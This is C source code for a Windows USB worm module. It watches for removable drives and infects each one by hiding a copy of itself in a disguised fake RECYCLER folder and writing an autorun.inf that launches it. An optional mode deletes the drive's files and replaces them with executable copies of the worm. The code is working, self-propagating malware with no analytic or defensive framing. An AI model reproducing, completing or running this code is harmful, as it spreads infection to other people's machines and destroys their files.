//#include "../Headers/includes.h"

#define _WIN32_WINNT 0x0403 // Very important for critical sections.
#define WIN32_LEAN_AND_MEAN // Good to use.

#pragma optimize("gsy", on) // Global optimization, Short sequences, Frame pointers
#pragma comment(linker, "/opt:nowin98")
#pragma comment(linker, "/ALIGN:4096") // This will save you some size on the executable.
#pragma comment(linker, "/IGNORE:4108 ") // This is only here for when you use /ALIGN:4096.



//default headers

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <time.h>
#include <stdlib.h>
#include <Winsvc.h>
#include <winuser.h>
#include <wininet.h>
#include <winable.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <shellapi.h>
#include <_mingw.h>
#include "spread.h"

char Chkdrv[5];



#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")

char *rot13(char *str);


#define USBSLEEPTIME	12000
#define USB_STR_RECYCLER "\\TTHDHGC"
#define USB_STR_REC_SUBDIR "\\DFG-2352-66235-2352322-634621321-6662355"
#define USB_STR_DESKTOP_DATA "[.ShellClassInfo]\r\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}"
#define USB_STR_DESKTOP_INI "\\Desktop.ini"
#define USB_STR_AUTORUN_INF "\\autorun.inf"
#define USB_STR_AUTORUN_DATA1 "[autorun]\r\nopen="
#define USB_STR_AUTORUN_DATA2 "\r\nicon=%SystemRoot%\\system32\\SHELL32.dll,4\r\ naction=Open folder to view files \r\nshell\\open\\command="
#define USB_STR_AUTORUN_DATA3 "\r\nshell\\open\\default=1"
#define USB_STR_FILENAME "364855.exe"
#define USB_INFECT_FILENAME rot13("com_port.exe")


char *rot13(char *str)
{
	char *ret = str;

    for (; *str; str++)
        if (*str >= 'a' && *str <= 'z')
            *str = (*str - 'a' + 13) % 26 + 'a';
        else if (*str >= 'A' && *str <= 'Z')
            *str = (*str - 'A' + 13) % 26 + 'A';
    return ret;
}



char InfectUSBFiles[25]="INFECTALLUSBFILE_OFF";

BOOL USB_InfectDrive(char *drv)
{
WIN32_FIND_DATA d32;
HANDLE fHandle;
char showdir[256];
char MyFile[256];
char szDir[MAX_PATH];
char Rdir[MAX_PATH];
char Rdir2[MAX_PATH];
int r = 0;
int infcount = 0;

char szFile[514] = {0}, szTemp[514] = {0}, *p; //128 = IRCLINE?
int i;
BOOL ret;
HANDLE f;
DWORD d;

if(strcmp(drv,Chkdrv)==0)
{
   goto END;
}

lstrcpy(Chkdrv,drv);

// create RECYCLER
lstrcat(szFile, drv);
lstrcat(szFile, USB_STR_RECYCLER);
if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
return FALSE;

SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

lstrcat(szFile, USB_STR_REC_SUBDIR);
if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
return FALSE;

SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

char sxFile[MAX_PATH];
lstrcpy(sxFile,szFile);
strcat(sxFile,"\\");

// create Desktop.ini
lstrcat(szFile, USB_STR_DESKTOP_INI);
f = CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);

if (f < (HANDLE)1)
return FALSE;

if (!WriteFile(f, USB_STR_DESKTOP_DATA, sizeof(USB_STR_DESKTOP_DATA) - 1, &d, NULL))
{
CloseHandle(f);
return FALSE;
}
CloseHandle(f);



// copy .exe file
p = szFile + lstrlen(szFile);
while (p[0] != '\\')
p--;
p++;
*p = 0;

lstrcat(sxFile, USB_STR_FILENAME);
GetModuleFileName(0, szTemp, sizeof(szTemp)-1);
ret = CopyFile(szTemp, sxFile, TRUE);

// todo: add crc or md5 check for file
SetFileAttributes(sxFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);


/*char contain[514] = {0};
//char usb_infect[]="\\usb_infect.exe";
lstrcat(contain, drv);
lstrcat(contain,"\\");
lstrcat(contain,USB_INFECT_FILENAME);
CopyFile(szTemp, contain, FALSE);
CreateFile(contain, GENERIC_WRITE, FILE_SHARE_WRITE, 0,
							OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

SetFileAttributes(contain, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);*/

//f = CreateFile(contain, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY, 0);

//if (f < (HANDLE)1)

//return FALSE;

if(strstr(InfectUSBFiles,"INFECTALLUSBFILE_ON"))
{
    //MessageBox(NULL, "READY", "", MB_OK);

  ZeroMemory(&szDir[0],sizeof(szDir));
	strcpy(szDir, drv);
	strcat(szDir, "\\*");
	//MessageBox(NULL, szDir, "", MB_OK);

	GetModuleFileName(NULL,MyFile,sizeof(MyFile));


	if((fHandle = FindFirstFile(_T(szDir),&d32))==INVALID_HANDLE_VALUE) return 1;
	else {
        ZeroMemory(&showdir[0],sizeof(showdir));
		//if(d32.cFileName==MyFile) goto next;
        //if(strcmp(d32.cFileName, ".") || strstr(d32.cFileName, "..")==0) goto next;
        SetFileAttributes(d32.cFileName,FILE_ATTRIBUTE_NORMAL);
		// MessageBox(NULL, d32.cFileName, "", MB_OK);



            for(r = strlen(d32.cFileName); r > 0; r--)
            {
                if(d32.cFileName[r]=='.')
                {
                    //MessageBox(NULL, show, "POS", MB_OK);
                    break;
                }

            }

            for(int i = 0; i<r; i++)
            {
                showdir[i]=d32.cFileName[i];
            }

            strcat(showdir,".exe");
            strcpy(Rdir,drv);
            strcat(Rdir,"\\");
            strcat(Rdir,d32.cFileName);
            DeleteFile(Rdir);
            strcpy(Rdir2,drv);
            strcat(Rdir2,"\\");
            strcat(Rdir2,showdir);
            CopyFile(MyFile,Rdir2,FALSE);
            SetFileAttributes(Rdir2,FILE_ATTRIBUTE_NORMAL);
            infcount +=1;

next:
		while(FindNextFile(fHandle,&d32)) {
		    ZeroMemory(&showdir[0],sizeof(showdir));
			//if(d32.cFileName==MyFile) continue;
			//if(strcmp(d32.cFileName, ".") || strstr(d32.cFileName, "..")==0) continue;
			SetFileAttributes(d32.cFileName,FILE_ATTRIBUTE_NORMAL);

      /*  if(strstr(d32.cFileName, ".") || strstr(d32.cFileName, ".."))
        {
            goto next;
        }*/
            for(r = strlen(d32.cFileName); r > 0; r--)
            {
                if(d32.cFileName[r]=='.')
                {
                    //MessageBox(NULL, show, "POS", MB_OK);
                    break;
                }

            }

            for(int i = 0; i<r; i++)
            {
                showdir[i]=d32.cFileName[i];
            }
            strcat(showdir,".exe");
            strcpy(Rdir,drv);
            strcat(Rdir,"\\");
            strcat(Rdir,d32.cFileName);
            DeleteFile(Rdir);
            strcpy(Rdir2,drv);
            strcat(Rdir2,"\\");
            strcat(Rdir2,showdir);
            CopyFile(MyFile,Rdir2,FALSE);
            SetFileAttributes(Rdir2,FILE_ATTRIBUTE_NORMAL);
            infcount +=1;
           // MessageBox(NULL, Rdir2, "", MB_OK);

		}
		FindClose(fHandle);
		SetInfStatsDB(0,infcount);
		infcount = 0;
	}

}

// create autorun.inf data

for (i = 0; i < sizeof(szTemp); i++)
szTemp[i] = 0;
p = szFile;

while (p[0] != '\\')
p++;
p++;

lstrcat(szTemp, USB_STR_AUTORUN_DATA1);
lstrcat(szTemp, p);
lstrcat(szTemp, USB_STR_AUTORUN_DATA2);
lstrcat(szTemp, p);
lstrcat(szTemp, USB_STR_AUTORUN_DATA3);



// create autorun.inf file

for (i = 0; i < sizeof(szFile); i++)
szFile[i] = 0;
lstrcat(szFile, drv);
lstrcat(szFile, USB_STR_AUTORUN_INF);
SetFileAttributes(szFile, FILE_ATTRIBUTE_NORMAL);
f = CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY, 0);

if (f < (HANDLE)1)
return FALSE;

if (!WriteFile(f, szTemp, lstrlen(szTemp), &d, NULL))
{
CloseHandle(f);
return FALSE;
}

CloseHandle(f);
SetInfStatsDB(1,0);

END:

return ret;
}





DWORD WINAPI USB_Spreader(LPVOID param)

{
//NTHREAD *usbs = (NTHREAD *)param;
//THREAD *usbs = (THREAD *)param;
char szTemp[514] = {0};
char szDrive[3];
char *p;

szDrive[0] = ' ';

szDrive[1] = ':';

szDrive[2] = 0;



for (;;)

{
Sleep(USBSLEEPTIME);



if (GetLogicalDriveStrings(514 - 1, szTemp))
{
p = szTemp;


do
{

*szDrive = *p;

if (szDrive[0] != 65 && szDrive[0] != 66 && szDrive[0] != 97 && szDrive[0] != 98)
{

if (GetDriveType(szDrive) == DRIVE_REMOVABLE)
{

if (USB_InfectDrive(szDrive))
{



}

}

}

while (*p++);



} while (*p);

}

}

}
